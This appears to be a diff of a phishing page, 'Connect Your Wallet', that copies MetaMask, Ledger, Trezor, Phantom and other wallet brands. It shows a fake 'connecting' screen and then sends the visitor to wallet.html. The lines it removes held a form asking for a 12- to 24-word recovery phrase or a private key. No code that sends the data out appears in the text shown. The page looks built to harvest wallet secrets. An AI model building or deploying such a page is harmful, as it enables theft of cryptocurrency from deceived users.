@@ -2,9 +2,9 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Connect Your Wallet</title>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet" />
   <style>
     body {
       margin: 0;
@@ -89,6 +89,7 @@
       margin-top: 5px;
     }
 
+    /* Loading Screen */
     .loading-screen {
       display: none;
       flex-direction: column;
@@ -116,123 +117,6 @@
       100% { content: '...'; }
     }
 
-    .phrase-container {
-      display: none;
-      flex-direction: column;
-      align-items: center;
-      background: rgba(255,255,255,0.05);
-      border-radius: 16px;
-      padding: 20px;
-      width: 90%;
-      max-width: 500px;
-      margin: 30px auto;
-      color: white;
-    }
-
-    .input-header {
-      display: flex;
-      justify-content: space-between;
-      margin-bottom: 15px;
-      flex-wrap: wrap;
-      gap: 10px;
-      width: 100%;
-    }
-
-    .type-tabs, .count-tabs {
-      display: flex;
-      gap: 10px;
-    }
-
-    .tab, .count-tab {
-      padding: 8px 14px;
-      background: transparent;
-      border: 1px solid #999;
-      border-radius: 8px;
-      color: #ccc;
-      cursor: pointer;
-      transition: 0.3s ease;
-    }
-
-    .tab.active, .count-tab.active {
-      background: black;
-      color: white;
-      border-color: #357ABD;
-    }
-
-    .input-box {
-      width: 100%;
-      background: black;
-      border: 1px solid #666;
-      border-radius: 8px;
-      padding: 12px;
-      font-size: 1rem;
-      color: white;
-      margin-bottom: 20px;
-      resize: none;
-    }
-
-    .submit-btn {
-      width: 100%;
-      padding: 12px;
-      background: black;
-      border: none;
-      border-radius: 8px;
-      color: white;
-      font-size: 1rem;
-      font-weight: bold;
-      cursor: pointer;
-      transition: 0.3s ease;
-    }
-
-    .submit-btn:hover {
-      background: #357ABD;
-    }
-
-    .trust-theme {
-  background: #0e1b2c;
-  border: 1px solid #235789;
-  box-shadow: 0 0 25px rgba(0, 123, 255, 0.3);
-}
-
-.count-dropdown {
-  position: relative;
-}
-
-.count-toggle {
-  background: #1a2e46;
-  border: 1px solid #357ABD;
-  color: #fff;
-  padding: 8px 12px;
-  border-radius: 6px;
-  cursor: pointer;
-  font-weight: 500;
-}
-
-.dropdown-menu {
-  display: none;
-  position: absolute;
-  top: 40px;
-  left: 0;
-  background: #1a2e46;
-  border: 1px solid #357ABD;
-  border-radius: 8px;
-  list-style: none;
-  padding: 0;
-  margin: 0;
-  width: 100%;
-  z-index: 100;
-}
-
-.dropdown-menu li {
-  padding: 10px 14px;
-  cursor: pointer;
-  color: white;
-}
-
-.dropdown-menu li:hover {
-  background-color: #357ABD;
-}
-
   </style>
 </head>
 <body>
@@ -240,44 +124,44 @@
 
   <!-- Wallet Connect Section -->
   <div class="container" id="mainContainer">
-    <img src="https://flare.network/api/media/file/Flare.svg" height="69">
+    <img src="https://flare.network/api/media/file/Flare.svg" height="69" alt="Flare Logo" />
     <h1>Connect Your Wallet</h1>
     <p>Select a wallet to proceed with secure authentication</p>
     <div class="wallet-grid">
       <div class="wallet-card" onclick="simulateConnect('download (1).png')">
-        <img src="download (1).png" alt="MetaMask">
+        <img src="download (1).png" alt="MetaMask" />
         <span>MetaMask Wallet</span>
       </div>
       <div class="wallet-card" onclick="simulateConnect('https://th.bing.com/th/id/OIP.WGb_hQQy46dNnJaleTTHfgHaE7?w=266&h=180&c=7&r=0&o=5&pid=1.7')">
-        <img src="https://th.bing.com/th/id/OIP.WGb_hQQy46dNnJaleTTHfgHaE7?w=266&h=180&c=7&r=0&o=5&pid=1.7" alt="Coinbase Wallet">
+        <img src="https://th.bing.com/th/id/OIP.WGb_hQQy46dNnJaleTTHfgHaE7?w=266&h=180&c=7&r=0&o=5&pid=1.7" alt="Coinbase Wallet" />
         <span>Coinbase Wallet</span>
       </div>
       <div class="wallet-card" onclick="simulateConnect('https://th.bing.com/th/id/OIP.xe87qJBHN_AvBR9Qoj6msgHaHa?rs=1&pid=ImgDetMain')">
-        <img src="https://th.bing.com/th/id/OIP.xe87qJBHN_AvBR9Qoj6msgHaHa?rs=1&pid=ImgDetMain" alt="Trust Wallet">
+        <img src="https://th.bing.com/th/id/OIP.xe87qJBHN_AvBR9Qoj6msgHaHa?rs=1&pid=ImgDetMain" alt="Trust Wallet" />
         <span>Trust Wallet</span>
       </div>
       <div class="wallet-card" onclick="simulateConnect('https://th.bing.com/th/id/OIP.ZjDq12xmfjLDPUETl95ALAHaHa?w=173&h=180&c=7&r=0&o=5&pid=1.7')">
-        <img src="https://th.bing.com/th/id/OIP.ZjDq12xmfjLDPUETl95ALAHaHa?w=173&h=180&c=7&r=0&o=5&pid=1.7" alt="Ledger">
+        <img src="https://th.bing.com/th/id/OIP.ZjDq12xmfjLDPUETl95ALAHaHa?w=173&h=180&c=7&r=0&o=5&pid=1.7" alt="Ledger" />
         <span>Ledger Wallet</span>
       </div>
       <div class="wallet-card" onclick="simulateConnect('https://th.bing.com/th/id/OIP.Vvh52pZ8b-KumLGGlltvXgAAAA?w=178&h=180&c=7&r=0&o=5&pid=1.7')">
-        <img src="https://th.bing.com/th/id/OIP.Vvh52pZ8b-KumLGGlltvXgAAAA?w=178&h=180&c=7&r=0&o=5&pid=1.7" alt="Trezor">
+        <img src="https://th.bing.com/th/id/OIP.Vvh52pZ8b-KumLGGlltvXgAAAA?w=178&h=180&c=7&r=0&o=5&pid=1.7" alt="Trezor" />
         <span>Trezor Wallet</span>
       </div>
-      <div class="wallet-card" onclick="simulateConnect('https://th.bing.com/th/id/OIP.Vvh52pZ8b-KumLGGlltvXgAAAA?w=178&h=180&c=7&r=0&o=5&pid=1.7')">
-        <img src="https://th.bing.com/th/id/OIP.xFg-YxD7XjwEnkVA6rqzYgHaHa?rs=1&pid=ImgDetMain" alt="Phantom">
+      <div class="wallet-card" onclick="simulateConnect('https://th.bing.com/th/id/OIP.xFg-YxD7XjwEnkVA6rqzYgHaHa?rs=1&pid=ImgDetMain')">
+        <img src="https://th.bing.com/th/id/OIP.xFg-YxD7XjwEnkVA6rqzYgHaHa?rs=1&pid=ImgDetMain" alt="Phantom" />
         <span>Phantom</span>
       </div>
       <div class="wallet-card" onclick="simulateConnect('https://th.bing.com/th/id/OIP.OhN4fWhIaaCpU7DeDVYmxQHaHa?rs=1&pid=ImgDetMain')">
-        <img src="https://th.bing.com/th/id/OIP.OhN4fWhIaaCpU7DeDVYmxQHaHa?rs=1&pid=ImgDetMain" alt="OKX">
+        <img src="https://th.bing.com/th/id/OIP.OhN4fWhIaaCpU7DeDVYmxQHaHa?rs=1&pid=ImgDetMain" alt="OKX" />
         <span>OKX Wallet</span>
       </div>
       <div class="wallet-card" onclick="simulateConnect('https://th.bing.com/th/id/OIP.3LcxiYEmtKV8dikafckIoQHaHa?rs=1&pid=ImgDetMain')">
-        <img src="https://th.bing.com/th/id/OIP.3LcxiYEmtKV8dikafckIoQHaHa?rs=1&pid=ImgDetMain" alt="Rabby wallet">
+        <img src="https://th.bing.com/th/id/OIP.3LcxiYEmtKV8dikafckIoQHaHa?rs=1&pid=ImgDetMain" alt="Rabby wallet" />
         <span>Rabby Wallet</span>
       </div>
       <div class="wallet-card" onclick="simulateConnect('https://th.bing.com/th/id/OIP.EAj_b3MGCNRHgn8M6vmSOAHaHa?pid=ImgDet&w=203&h=203&c=7')">
-        <img src="https://th.bing.com/th/id/OIP.EAj_b3MGCNRHgn8M6vmSOAHaHa?pid=ImgDet&w=203&h=203&c=7" alt="Uniswap Wallet">
+        <img src="https://th.bing.com/th/id/OIP.EAj_b3MGCNRHgn8M6vmSOAHaHa?pid=ImgDet&w=203&h=203&c=7" alt="Uniswap Wallet" />
         <span>Uniswap Wallet</span>
       </div>
     </div>
@@ -285,167 +169,30 @@
 
   <!-- Loading Screen -->
   <div class="loading-screen" id="loadingScreen">
-    <img id="walletLogo" src="" alt="Loading Wallet">
+    <img id="walletLogo" src="" alt="Loading Wallet" />
     <p>Connecting to wallet<span class="loading-dots"></span></p>
   </div>
 
-  <div class="phrase-container trust-theme" id="phraseScreen">
-  <div class="input-header">
-    <div class="type-tabs">
-      <button class="tab active" data-type="phrase" onclick="switchType('phrase')">Phrase</button>
-      <button class="tab" data-type="key" onclick="switchType('key')">Private Key</button>
-    </div>
-    <div class="count-dropdown" id="phraseCountDropdown">
-      <button class="count-toggle" onclick="toggleDropdown()">12 Words ▼</button>
-      <ul class="dropdown-menu" id="countMenu">
-        <li onclick="selectCount(12)">12 Words</li>
-        <li onclick="selectCount(15)">15 Words</li>
-        <li onclick="selectCount(18)">18 Words</li>
-        <li onclick="selectCount(24)">24 Words</li>
-      </ul>
-    </div>
-  </div>
-
-  <form class="wallet-form">
-    <textarea class="input-box" placeholder="Enter your recovery phrase" rows="4"></textarea>
-    <button type="submit" class="submit-btn">Connect</button>
-  </form>
-</div>
-
-
-
   <script>
-    function simulateConnect(logoUrl) {
-  const loadingScreen = document.getElementById('loadingScreen');
-  const walletLogo = document.getElementById('walletLogo');
-  const mainContainer = document.getElementById('mainContainer');
-  const phraseScreen = document.getElementById('phraseScreen');
-  function simulateConnect(logoUrl) {
-  const loadingScreen = document.getElementById('loadingScreen');
-  const walletLogo = document.getElementById('walletLogo');
-  const mainContainer = document.getElementById('mainContainer');
-
-  walletLogo.src = logoUrl;
-  mainContainer.style.display = 'none';
-  loadingScreen.style.display = 'flex';
-
-  setTimeout(() => {
-    window.location.href = 'wallet.html'; // Redirect to another page
-  }, 3000);
-}
-
-
-  walletLogo.src = logoUrl;
-  mainContainer.style.display = 'none';
-  phraseScreen.style.display = 'none';
-  loadingScreen.style.display = 'flex';
-
-  setTimeout(() => {
-    loadingScreen.style.display = 'none';
-    phraseScreen.style.display = 'flex';
-  }, 3000);
-}
-
-    const tabs = document.querySelectorAll('.tab');
-    const countTabs = document.querySelectorAll('.count-tab');
-    const textarea = document.querySelector('.input-box');
-
-    tabs.forEach(tab => {
-      tab.addEventListener('click', () => {
-        tabs.forEach(t => t.classList.remove('active'));
-        tab.classList.add('active');
-
-        if (tab.dataset.type === "key") {
-          textarea.placeholder = "Enter your private key";
-          textarea.rows = 2;
-        } else {
-          textarea.placeholder = "Enter your recovery phrase";
-          textarea.rows = 4;
-        }
-      });
-    });
-
-    countTabs.forEach(btn => {
-      btn.addEventListener('click', () => {
-        countTabs.forEach(c => c.classList.remove('active'));
-        btn.classList.add('active');
-      });
-    });
-
     function simulateConnect(logoUrl) {
       const loadingScreen = document.getElementById('loadingScreen');
       const walletLogo = document.getElementById('walletLogo');
       const mainContainer = document.getElementById('mainContainer');
-      const phraseScreen = document.getElementById('phraseScreen');
 
+      // Set wallet logo
       walletLogo.src = logoUrl;
+
+      // Hide main wallet selection UI
       mainContainer.style.display = 'none';
-      phraseScreen.style.display = 'none';
+
+      // Show loading screen
       loadingScreen.style.display = 'flex';
 
+      // After 3 seconds, redirect to wallet.html
       setTimeout(() => {
-        loadingScreen.style.display = 'none';
-        phraseScreen.style.display = 'flex';
+        window.location.href = 'wallet.html';
       }, 3000);
     }
-    let currentCount = 12;
-
-function toggleDropdown() {
-  const menu = document.getElementById('countMenu');
-  menu.style.display = menu.style.display === 'block' ? 'none' : 'block';
-}
-
-function selectCount(num) {
-  currentCount = num;
-  document.querySelector('.count-toggle').textContent = `${num} Words ▼`;
-  document.getElementById('countMenu').style.display = 'none';
-}
-
-function switchType(type) {
-  const tabs = document.querySelectorAll('.tab');
-  tabs.forEach(tab => tab.classList.remove('active'));
-  document.querySelector(`.tab[data-type="${type}"]`).classList.add('active');
-
-  const dropdown = document.getElementById('phraseCountDropdown');
-  if (type === 'phrase') {
-    dropdown.style.display = 'block';
-    document.querySelector('.input-box').placeholder = 'Enter your recovery phrase';
-  } else {
-    dropdown.style.display = 'none';
-    document.querySelector('.input-box').placeholder = 'Enter your private key';
-  }
-}
-
   </script>
 </body>
 </html>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
